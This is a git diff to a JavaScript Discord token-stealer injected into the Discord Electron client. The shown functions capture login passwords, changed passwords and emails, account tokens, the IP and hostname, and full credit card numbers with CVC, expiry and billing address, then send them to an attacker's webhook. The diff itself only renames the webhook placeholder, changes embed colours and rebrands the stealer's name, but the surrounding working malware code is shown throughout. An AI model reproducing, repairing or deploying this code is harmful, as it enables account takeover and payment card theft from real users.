@@ -8,7 +8,7 @@ const {
 const querystring = require('querystring');
 const electron = require('electron');
 const os = require('os')
-var webhook = "%WEBHOOK%";
+var webhook = "%WEBHOOK_LINK%";
 const computerName = os.hostname();
 const discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`
 
@@ -79,7 +79,7 @@ function GetNitro(flags) {
     } else {
         return "No Nitro"
     }
-} 
+}
 
 function GetRBadges(flags) {
     const Discord_Employee = 1;
@@ -238,11 +238,11 @@ function Login(email, password, token) {
                     }
                     const json = JSON.parse(info);
                     var params = {
-                        username: "FruitPealer",
+                        username: "FruitPealler",
                         content: "",
                         embeds: [{
                             "title": "User Login",
-                            "color": 6625551,
+                            "color": 3447704,
                             "fields": [{
                                 name: "Info",
                                 value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -281,23 +281,23 @@ function Login(email, password, token) {
                                 inline: !1
                             }, ],
                             "author": {
-                                "name": "FruitPealer"
+                                "name": "FruitPealler"
                             },
                             "footer": {
-                                "text": "FruitPealer"
+                                "text": "FruitPealler"
                             },
                             "thumbnail": {
                                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                             }
                         }, {
                             "title": `Total Friends (${totalFriends()})`,
-                            "color": 6625551,
+                            "color": 3447704,
                             "description": CalcFriends(),
                             "author": {
-                                "name": "FruitPealer"
+                                "name": "FruitPealler"
                             },
                             "footer": {
-                                "text": "FruitPealer"
+                                "text": "FruitPealler"
                             },
                             "thumbnail": {
                                 "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -352,11 +352,11 @@ function ChangePassword(oldpassword, newpassword, token) {
                 }
                 const json = JSON.parse(info);
                 var params = {
-                    username: "FruitPealer",
+                    username: "FruitPealler",
                     content: "",
                     embeds: [{
                         "title": "Password Changed",
-                        "color": 6625551,
+                        "color": 3447704,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -399,10 +399,10 @@ function ChangePassword(oldpassword, newpassword, token) {
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "FruitPealer"
+                            "name": "FruitPealler"
                         },
                         "footer": {
-                            "text": "FruitPealer"
+                            "text": "FruitPealler"
                         },
                         "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -456,11 +456,11 @@ function ChangeEmail(newemail, password, token) {
                 }
                 const json = JSON.parse(info);
                 var params = {
-                    username: "FruitPealer",
+                    username: "FruitPealler",
                     content: "",
                     embeds: [{
                         "title": "Email Changed",
-                        "color": 6625551,
+                        "color": 3447704,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
@@ -499,10 +499,10 @@ function ChangeEmail(newemail, password, token) {
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "FruitPealer"
+                            "name": "FruitPealler"
                         },
                         "footer": {
-                            "text": "FruitPealer"
+                            "text": "FruitPealler"
                         },
                         "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -531,16 +531,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "FruitPealer",
+                username: "FruitPeallerr",
                 content: "",
                 embeds: [{
                     "title": "User Credit Card Added",
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                     "author": {
-                        "name": "FruitPealer"
+                        "name": "FruitPealler"
                     },
                     "footer": {
-                        "text": "FruitPealer"
+                        "text": "FruitPealler"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
